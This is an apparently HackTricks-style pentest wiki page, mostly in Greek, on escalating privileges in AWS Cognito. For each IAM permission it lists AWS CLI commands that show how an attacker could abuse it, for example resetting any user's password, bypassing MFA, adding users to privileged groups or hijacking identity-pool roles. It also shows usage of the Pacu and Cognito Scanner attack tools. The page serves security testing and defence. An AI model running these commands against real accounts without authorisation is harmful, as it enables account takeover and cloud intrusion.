# AWS - Cognito Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Cognito

Για περισσότερες πληροφορίες σχετικά με το Cognito δείτε:

{{#ref}}
../../aws-services/aws-cognito-enum/
{{#endref}}

### Συλλογή credentials από Identity Pool

Εφόσον το Cognito μπορεί να εκδώσει **IAM role credentials** τόσο σε **authenticated** όσο και σε **unauthenticated** **users**, αν εντοπίσετε το **Identity Pool ID** μιας εφαρμογής (συνήθως είναι hardcoded σε αυτή) μπορείτε να αποκτήσετε νέα credentials και επομένως privesc (μέσα σε έναν AWS account όπου πιθανόν να μην είχατε προηγουμένως κανένα credential).

For more information [**check this page**](../../aws-unauthenticated-enum-access/index.html#cognito).

**Potential Impact:** Άμεση privesc στο services role attached στους unauth users (και πιθανώς σε αυτό που είναι attached στους auth users).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Με αυτή την άδεια μπορείτε να **παραχωρήσετε οποιοδήποτε cognito role** στους authenticated/unauthenticated users της cognito app.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374"
```
Εάν η εφαρμογή cognito **δεν έχει ενεργοποιημένους ανώνυμους χρήστες** μπορεί επίσης να χρειαστείς την άδεια `cognito-identity:UpdateIdentityPool` για να την ενεργοποιήσεις.

**Πιθανός Αντίκτυπος:** Άμεσο privesc σε οποιονδήποτε cognito ρόλο.

### `cognito-identity:update-identity-pool`

Ένας επιτιθέμενος με αυτήν την άδεια θα μπορούσε, για παράδειγμα, να ρυθμίσει ένα Cognito User Pool υπό τον έλεγχό του ή οποιονδήποτε other identity provider όπου μπορεί να κάνει login ως **τρόπος πρόσβασης σε αυτό το Cognito Identity Pool**. Στη συνέχεια, απλώς το **login** σε αυτόν τον identity provider θα **του επιτρέψει να αποκτήσει πρόσβαση στον ρυθμισμένο authenticated role στο Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Είναι επίσης δυνατό να **καταχραστείτε αυτήν την άδεια για να επιτρέψετε basic auth**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Πιθανός Αντίκτυπος**: Συμβιβασμός του διαμορφωμένου επαληθευμένου ρόλου IAM μέσα στο identity pool.

### `cognito-idp:AdminAddUserToGroup`

Αυτό το δικαίωμα επιτρέπει την **προσθήκη ενός Cognito χρήστη σε μια Cognito ομάδα**, επομένως ένας επιτιθέμενος θα μπορούσε να κακοχρησιμοποιήσει αυτό το δικαίωμα για να προσθέσει έναν χρήστη υπό τον έλεγχό του σε άλλες ομάδες με **καλύτερα** προνόμια ή **διαφορετικούς ρόλους IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Πιθανός Αντίκτυπος:** Privesc to other Cognito groups and IAM roles attached to User Pool Groups.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Ένας επιτιθέμενος με αυτά τα δικαιώματα θα μπορούσε να **δημιουργήσει/ενημερώσει ομάδες** με **κάθε IAM role που μπορεί να χρησιμοποιηθεί από έναν παραβιασμένο Cognito Identity Provider** και να κάνει έναν παραβιασμένο χρήστη μέρος της ομάδας, αποκτώντας πρόσβαση σε όλους αυτούς τους ρόλους:
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
**Πιθανός Αντίκτυπος:** Privesc σε άλλους ρόλους Cognito IAM.

### `cognito-idp:AdminConfirmSignUp`

Αυτή η άδεια επιτρέπει την **επιβεβαίωση εγγραφής**. Εξ ορισμού ο οποιοσδήποτε μπορεί να συνδεθεί σε εφαρμογές Cognito — αν αυτό παραμείνει, ένας χρήστης θα μπορούσε να δημιουργήσει λογαριασμό με οποιαδήποτε δεδομένα και να τον επιβεβαιώσει με αυτή την άδεια.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Πιθανός αντίκτυπος:** Έμμεσο privesc στο identity pool IAM role για authenticated users αν μπορείτε να εγγράψετε νέο χρήστη. Έμμεσο privesc σε άλλες λειτουργίες της εφαρμογής μέσω της δυνατότητας επιβεβαίωσης οποιουδήποτε λογαριασμού.

### `cognito-idp:AdminCreateUser`

Αυτή η άδεια θα επέτρεπε σε έναν επιτιθέμενο να δημιουργήσει νέο χρήστη μέσα στο user pool. Ο νέος χρήστης δημιουργείται ως enabled, αλλά θα χρειαστεί να αλλάξει τον κωδικό του.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Πιθανός Αντίκτυπος:** Άμεσο privesc στο identity pool IAM role για επαληθευμένους χρήστες. Έμμεσο privesc σε άλλες λειτουργίες της εφαρμογής, δίνοντας τη δυνατότητα να δημιουργηθεί οποιοσδήποτε χρήστης

### `cognito-idp:AdminEnableUser`

Αυτό το δικαίωμα μπορεί να βοηθήσει σε ένα πολύ σπάνιο σενάριο όπου ένας επιτιθέμενος βρήκε τα διαπιστευτήρια ενός απενεργοποιημένου χρήστη και χρειάζεται να το **επαναενεργοποιήσει**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Πιθανή Επίπτωση:** Έμμεση privesc στο identity pool IAM role για authenticated users και στα δικαιώματα του χρήστη εάν ο επιτιθέμενος είχε διαπιστευτήρια ενός απενεργοποιημένου χρήστη.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Αυτό το permission επιτρέπει σύνδεση με τη [**method ADMIN_USER_PASSWORD_AUTH**](../../aws-services/aws-cognito-enum/cognito-user-pools.md#admin_no_srp_auth-and-admin_user_password_auth)**.** Για περισσότερες πληροφορίες ακολουθήστε τον σύνδεσμο.

### `cognito-idp:AdminSetUserPassword`

Αυτό το permission θα επέτρεπε σε έναν επιτιθέμενο να **αλλάξει τον κωδικό πρόσβασης οποιουδήποτε χρήστη**, καθιστώντας τον ικανό να υποδυθεί οποιονδήποτε χρήστη (που δεν έχει ενεργοποιημένο MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Πιθανός αντίκτυπος:** Άμεσο privesc σε ενδεχομένως οποιονδήποτε χρήστη — επομένως πρόσβαση σε όλες τις ομάδες στις οποίες ανήκει κάθε χρήστης και πρόσβαση στον Identity Pool authenticated IAM role.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Ένας επιτιθέμενος θα μπορούσε ενδεχομένως να καταχραστεί αυτό το δικαίωμα για να ορίσει ένα κινητό τηλέφωνο που ελέγχει ως **SMS MFA ενός χρήστη**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Παρόμοιο με το προηγούμενο, αυτή η άδεια μπορεί να χρησιμοποιηθεί για να ορίσει τις προτιμήσεις MFA ενός χρήστη ώστε να bypass την προστασία του MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Παρόμοια με την προηγούμενη, αυτή η άδεια μπορεί να χρησιμοποιηθεί για να ορίσει τις MFA προτιμήσεις ενός user pool ώστε να bypass την προστασία MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Είναι επίσης δυνατό να ενημερώσετε το user pool για να αλλάξετε την πολιτική MFA. [Check cli here](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Πιθανές Επιπτώσεις:** Έμμεση privesc σε οποιονδήποτε χρήστη του οποίου τα διαπιστευτήρια γνωρίζει ο επιτιθέμενος — αυτό θα μπορούσε να επιτρέψει την παράκαμψη της προστασίας MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Ένας επιτιθέμενος με αυτήν την άδεια θα μπορούσε να αλλάξει το email ή τον αριθμό τηλεφώνου ή οποιοδήποτε άλλο χαρακτηριστικό ενός χρήστη υπό τον έλεγχό του για να προσπαθήσει να αποκτήσει περισσότερα προνόμια σε μια υποκείμενη εφαρμογή.\
Αυτό επιτρέπει την αλλαγή ενός email ή αριθμού τηλεφώνου και τον ορισμό τους ως επιβεβαιωμένων.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Πιθανός αντίκτυπος:** Πιθανή έμμεση privesc στην υποκείμενη εφαρμογή που χρησιμοποιεί Cognito User Pool και παραχωρεί προνόμια βάσει χαρακτηριστικών χρήστη.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Ένας επιτιθέμενος με αυτό το δικαίωμα θα μπορούσε να **δημιουργήσει νέο User Pool Client με λιγότερους περιορισμούς** σε σχέση με τους ήδη υπάρχοντες pool clients. Για παράδειγμα, ο νέος client θα μπορούσε να επιτρέπει οποιοδήποτε τρόπο αυθεντικοποίησης, να μην έχει κανένα secret, να έχει token revocation disabled, να επιτρέπει τα tokens να είναι έγκυρα για μεγαλύτερο χρονικό διάστημα...

Το ίδιο μπορεί να γίνει αν αντί να δημιουργηθεί νέος client, **τροποποιηθεί ένας υπάρχων**.

Στη [**command line**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ή στην [**update one**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) μπορείτε να δείτε όλες τις επιλογές — ελέγξτε το!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Πιθανός Αντίκτυπος:** Πιθανός έμμεσος privesc στον εξουσιοδοτημένο χρήστη του Identity Pool που χρησιμοποιείται από το User Pool, μέσω της δημιουργίας ενός νέου client που χαλαρώνει τα μέτρα ασφαλείας και επιτρέπει σε έναν επιτιθέμενο να συνδεθεί με έναν χρήστη που κατάφερε να δημιουργήσει.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Ένας επιτιθέμενος θα μπορούσε να καταχραστεί αυτή την άδεια για να δημιουργήσει χρήστες ανεβάζοντας ένα csv με νέους χρήστες.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(Σε περίπτωση που δημιουργήσετε ένα νέο import job μπορεί επίσης να χρειαστείτε την iam passrole permission, δεν το έχω δοκιμάσει ακόμα).

**Πιθανός αντίκτυπος:** Άμεσο privesc στο identity pool IAM role για επαληθευμένους χρήστες. Έμμεσο privesc σε άλλες λειτουργίες της εφαρμογής που μπορούν να δημιουργήσουν οποιονδήποτε χρήστη.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Ένας attacker θα μπορούσε να δημιουργήσει έναν νέο identity provider ώστε στη συνέχεια να μπορεί να **login through this provider**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potential Impact:** Άμεσο privesc στο identity pool IAM role για authenticated users. Έμμεσο privesc σε άλλες λειτουργίες της εφαρμογής που μπορούν να δημιουργήσουν οποιονδήποτε χρήστη.

### cognito-sync:* Ανάλυση

Αυτή είναι μια πολύ κοινή permission από προεπιλογή σε roles των Cognito Identity Pools. Ακόμα κι αν ένα wildcard σε permissions πάντα φαίνεται κακό (ειδικά όταν προέρχεται από AWS), οι παρεχόμενες permissions δεν είναι ιδιαίτερα χρήσιμες από την πλευρά ενός attacker.

Αυτή η άδεια επιτρέπει την ανάγνωση πληροφοριών χρήστη των Identity Pools και Identity IDs εντός των Identity Pools (που δεν είναι ευαίσθητες πληροφορίες).\
Identity IDs might have [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html) assigned to them, which are information of the sessions (AWS define it like a **αποθηκευμένο παιχνίδι**). It might be possible that this contain some kind of sensitive information (but the probability is pretty low). You can find in the [**enumeration page**](../../aws-services/aws-cognito-enum/index.html) how to access this information.

Ένας attacker θα μπορούσε επίσης να χρησιμοποιήσει αυτές τις άδειες για να **εγγραφεί σε ένα Cognito stream που publish changes** σε αυτά τα datasets ή σε ένα **lambda που triggers on cognito events**. Δεν το έχω δει να χρησιμοποιείται, και δεν θα περίμενα ευαίσθητες πληροφορίες εδώ, αλλά δεν είναι αδύνατο.

### Automatic Tools

- [Pacu](https://github.com/RhinoSecurityLabs/pacu), the AWS exploitation framework, now includes the "cognito__enum" and "cognito__attack" modules that automate enumeration of all Cognito assets in an account and flag weak configurations, user attributes used for access control, etc., and also automate user creation (including MFA support) and privilege escalation based on modifiable custom attributes, usable identity pool credentials, assumable roles in id tokens, etc.

For a description of the modules' functions see part 2 of the [blog post](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). For installation instructions see the main [Pacu](https://github.com/RhinoSecurityLabs/pacu) page.

#### Usage

Παράδειγμα χρήσης cognito__attack για προσπάθεια δημιουργίας χρήστη και όλων των privesc vectors ενάντια σε ένα δοσμένο identity pool και user pool client:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Παράδειγμα χρήσης cognito\_\_enum για τη συλλογή όλων των user pools, user pool clients, identity pools, users κ.λπ. που είναι ορατά στον τρέχοντα AWS λογαριασμό:
```bash
Pacu (new:test) > run cognito__enum
```
- [Cognito Scanner](https://github.com/padok-team/cognito-scanner) είναι ένα CLI εργαλείο σε python που υλοποιεί διάφορες επιθέσεις στο Cognito, συμπεριλαμβανομένης μιας privesc escalation.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Χρήση
```bash
$ cognito-scanner --help
```
Για περισσότερες πληροφορίες, δείτε [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{{#include ../../../../banners/hacktricks-training.md}}
